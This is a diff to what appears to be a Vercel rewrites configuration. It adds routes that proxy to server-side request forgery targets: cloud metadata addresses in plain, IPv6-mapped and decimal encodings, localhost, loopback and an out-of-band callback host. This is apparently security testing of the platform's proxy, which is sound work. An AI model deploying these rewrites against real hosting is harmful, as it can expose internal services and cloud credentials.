@@ -2,11 +2,35 @@
   "rewrites": [
     {
       "source": "/ssrf-oob",
-      "destination": "http://vercel-ssrf-test.rccfgkxjzxqnwrexlhabvhw3ew2wq9fbg.oast.fun/"
+      "destination": "https://rccfgkxjzxqnwrexlhabvhw3ew2wq9fbg.oast.fun/"
+    },
+    {
+      "source": "/ssrf-ipv6",
+      "destination": "http://[::ffff:169.254.169.254]/latest/meta-data/"
     },
     {
       "source": "/ssrf-decimal",
       "destination": "http://2852039166/latest/meta-data/"
+    },
+    {
+      "source": "/ssrf-localhost",
+      "destination": "http://localhost/"
+    },
+    {
+      "source": "/ssrf-loopback",
+      "destination": "http://127.0.0.1/"
+    },
+    {
+      "source": "/ssrf-ecs",
+      "destination": "http://169.254.170.2/v2/metadata"
+    },
+    {
+      "source": "/ssrf-ecs-ipv6",
+      "destination": "http://[::ffff:169.254.170.2]/v2/metadata"
+    },
+    {
+      "source": "/ssrf-ecs-decimal",
+      "destination": "http://2852040194/v2/metadata"
     }
   ]
 }
